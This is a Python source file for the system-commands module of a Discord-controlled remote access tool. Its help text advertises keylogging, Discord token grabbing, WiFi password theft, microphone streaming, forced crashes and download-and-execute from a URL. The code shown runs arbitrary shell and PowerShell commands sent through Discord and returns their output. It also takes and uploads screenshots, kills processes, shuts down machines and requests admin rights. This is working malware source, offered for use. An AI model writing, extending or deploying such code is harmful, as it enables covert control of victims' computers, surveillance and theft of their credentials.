"""
commands/system.py - general system control commands with macOS support.
"""

import os
import platform
import subprocess
import tempfile
import sys

import discord
import psutil
import pyautogui
import pyttsx3
from discord.ext import commands
from discord.ext.commands import MissingRequiredArgument
from plyer import notification

import utils
from config import IS_WINDOWS, bot
from utils import (
    check_if_admin,
    chunk_string,
    elevate,
    generic_command_error,
    in_correct_channel,
    is_admin,
    is_authorized,
    is_bot_or_command,
    load_admin_status,
    log_message,
    wrong_channel,
)


class SystemCommands(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="help")
    @commands.check(is_authorized)
    async def custom_help(self, ctx):
        help_text = """
    **Available Commands:**
    `!ping` - Shows the bot's latency.
    `!screenshot` - Takes a screenshot and sends it.
    `!cmd <command>` - Executes a Shell/CMD command.
    `!powershell <command>` - Executes a PowerShell command (Windows Only).
    `!file_upload <target_path>` - Uploads a file.
    `!file_download <file_path>` - Sends a file or folder to Discord.
    `!execute <url>` - Downloads and executes a file from the URL.
    `!notify <title> <message>` - Sends a notification.
    `!restart` - Restarts the PC.
    `!shutdown` - Shuts down the PC.
    `!admin` - Requests admin/root rights.
    `!stop` - Stops the bot.
    `!wifi` - Shows WiFi profiles and passwords.
    `!system_info` - Shows system information.
    `!tasklist` - Lists every running process with Name and PID.
    `!taskkill <pid>` - Kills a process with the given PID.
    `!tts <message>` - Plays a custom text-to-speech message.
    `!mic_stream_start` - Starts a live stream of the microphone.
    `!mic_stream_stop` - Stops the mic stream.
    `!keylog <on/off>` - Activates or deactivates keylogging.
    `!bsod` - Triggers a Blue Screen (Windows) or Kernel Panic (Mac).
    `!input <block/unblock>` - Blocks or unblocks user input.
    `!blackscreen <on/off>` - Makes the screen completely black.
    `!volume` - Shows volume information.
    `!grab_discord` - Grabs Discord Tokens and info.
    `!purge` - Deletes bot messages and commands.
        """
        embed = discord.Embed(title="Help", description=help_text, color=0x0084FF)
        await ctx.send(embed=embed)

    @commands.command()
    @commands.check(is_authorized)
    async def purge(self, ctx):
        try:
            deleted = await ctx.channel.purge(limit=200, check=is_bot_or_command)
            await log_message(ctx, f"{len(deleted)} messages deleted.", duration=5)
        except Exception as e:
            await log_message(ctx, f"Error deleting messages: {e}", duration=5)

    @commands.command()
    @commands.check(is_authorized)
    async def ping(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        latency = round(self.bot.latency * 1000)
        await log_message(ctx, f"🏓 Pong! Latency: {latency}ms")

    @commands.command()
    @commands.check(is_authorized)
    async def screenshot(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            path = os.path.join(tempfile.gettempdir(), "screenshot.png")
            pyautogui.screenshot().save(path)
            await ctx.send(file=discord.File(path))
            await log_message(ctx, "Screenshot created and sent.")
            os.remove(path)
        except Exception as e:
            await log_message(ctx, f"Error creating screenshot: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def cmd(self, ctx, *, command):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        working = await ctx.send("🔄 Working...")
        try:
            # shell=True uses /bin/sh on macOS, which is what we want
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="ignore",
            )
            await working.delete()
            combined = ""
            if result.stdout:
                combined += f"Standard Output:\n{result.stdout}\n"
            if result.stderr:
                combined += f"Standard Error:\n{result.stderr}\n"
            
            if not combined:
                combined = "Command executed with no output."

            for chunk in chunk_string(combined):
                await ctx.send(f"```{chunk}```")
            await log_message(ctx, f"Command executed: {command}")
        except Exception as e:
            await log_message(ctx, f"Error executing command: {e}")
        finally:
            try:
                await working.delete()
            except discord.errors.NotFound:
                pass

    @commands.command()
    @commands.check(is_authorized)
    async def powershell(self, ctx, *, command):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        
        if not IS_WINDOWS:
            await log_message(ctx, "❌ PowerShell is only supported on Windows. Use `!cmd` for macOS.")
            return

        working = await ctx.send("🔄 Working...")
        try:
            result = subprocess.run(
                ["powershell", command],
                shell=True,
                capture_output=True,
                text=True,
                encoding="utf-8",
                errors="ignore",
            )
            await working.delete()
            combined = ""
            if result.stdout:
                combined += f"Standard Output:\n{result.stdout}\n"
            if result.stderr:
                combined += f"Standard Error:\n{result.stderr}\n"
            for chunk in chunk_string(combined):
                await ctx.send(f"```{chunk}```")
            await log_message(ctx, f"PowerShell command executed: {command}")
        except Exception as e:
            try:
                await working.delete()
            except discord.errors.NotFound:
                pass
            await log_message(ctx, f"Error executing command: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def system_info(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            u = platform.uname()
            if platform.system() == "Darwin":
                # Get specific macOS version
                mac_ver = platform.mac_ver()[0]
                system_str = f"macOS {mac_ver}"
            else:
                system_str = u.system

            info = (
                f"**System Information:**\n"
                f"System: {system_str}\nNode Name: {u.node}\nRelease: {u.release}\n"
                f"Version: {u.version}\nMachine: {u.machine}\nProcessor: {u.processor}"
            )
            await ctx.send(info)
            await log_message(ctx, "System information retrieved.")
        except Exception as e:
            await log_message(ctx, f"Error retrieving system information: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def tasklist(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            processes = [(p.pid, p.info["name"]) for p in psutil.process_iter(["name"])]
            process_list = "\n".join(
                f"PID: {pid}, Name: {name}" for pid, name in processes
            )
            for chunk in chunk_string(process_list):
                await ctx.send(f"```\n{chunk}\n```")
            await log_message(ctx, "Process list retrieved.")
        except Exception as e:
            await log_message(ctx, f"Error retrieving process list: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def taskkill(self, ctx, identifier: str):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            try:
                pid = int(identifier)
                psutil.Process(pid).terminate()
                await log_message(ctx, f"Process with PID {pid} has been terminated.")
            except ValueError:
                identifier = identifier.lower()
                found = False
                for proc in psutil.process_iter(["pid", "name"]):
                    if identifier in proc.info["name"].lower():
                        proc.terminate()
                        await log_message(
                            ctx,
                            f"Process {proc.info['name']} (PID {proc.info['pid']}) terminated.",
                        )
                        found = True
                        break
                if not found:
                    await log_message(
                        ctx, f"No process with the name {identifier} found."
                    )
        except Exception as e:
            await log_message(ctx, f"Error terminating process: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def notify(self, ctx, title, message):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            if platform.system() == "Darwin":
                # Native macOS notification via AppleScript
                apple_script = f'display notification "{message}" with title "{title}"'
                subprocess.run(["osascript", "-e", apple_script])
            else:
                notification.notify(title=title, message=message, timeout=10)
            await log_message(ctx, f"Notification sent: {title} - {message}")
        except Exception as e:
            await log_message(ctx, f"Error sending notification: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def restart(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            await log_message(ctx, "The PC is restarting.")
            if IS_WINDOWS:
                subprocess.run(["shutdown", "/r", "/t", "0"], shell=True)
            elif platform.system() == "Darwin":
                # Uses AppleScript to trigger restart without needing sudo
                subprocess.run(["osascript", "-e", 'tell app "System Events" to restart'])
            else:
                subprocess.run(["reboot"], check=True)
        except Exception as e:
            await log_message(ctx, f"Error restarting the PC: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def shutdown(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        try:
            await log_message(ctx, "The PC is shutting down.")
            if IS_WINDOWS:
                subprocess.run(["shutdown", "/s", "/t", "0"], shell=True)
            elif platform.system() == "Darwin":
                # Uses AppleScript to trigger shutdown without needing sudo
                subprocess.run(["osascript", "-e", 'tell app "System Events" to shut down'])
            else:
                subprocess.run(["shutdown", "-h", "now"], check=True)
        except Exception as e:
            await log_message(ctx, f"Error shutting down the PC: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def admin(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        if check_if_admin():
            utils.is_admin = True
            await log_message(ctx, "Admin/Root rights already present.")
            return
        try:
            if elevate():
                await log_message(
                    ctx, "Elevation requested. The old process will now be terminated."
                )
                import asyncio
                await asyncio.sleep(2)
                os._exit(0)
        except Exception as e:
            await log_message(ctx, f"Error requesting admin rights: {e}")

    @commands.command()
    @commands.check(is_authorized)
    async def stop(self, ctx):
        if not in_correct_channel(ctx):
            await wrong_channel(ctx)
            return
        await log_message(ctx, "Bot is stopping.")
        try:
            engine = pyttsx3.init()
            engine.stop()
        except Exception:
            pass
        await self.bot.close()


async def setup(bot):
    bot.remove_command("help")
    await bot.add_cog(SystemCommands(bot))
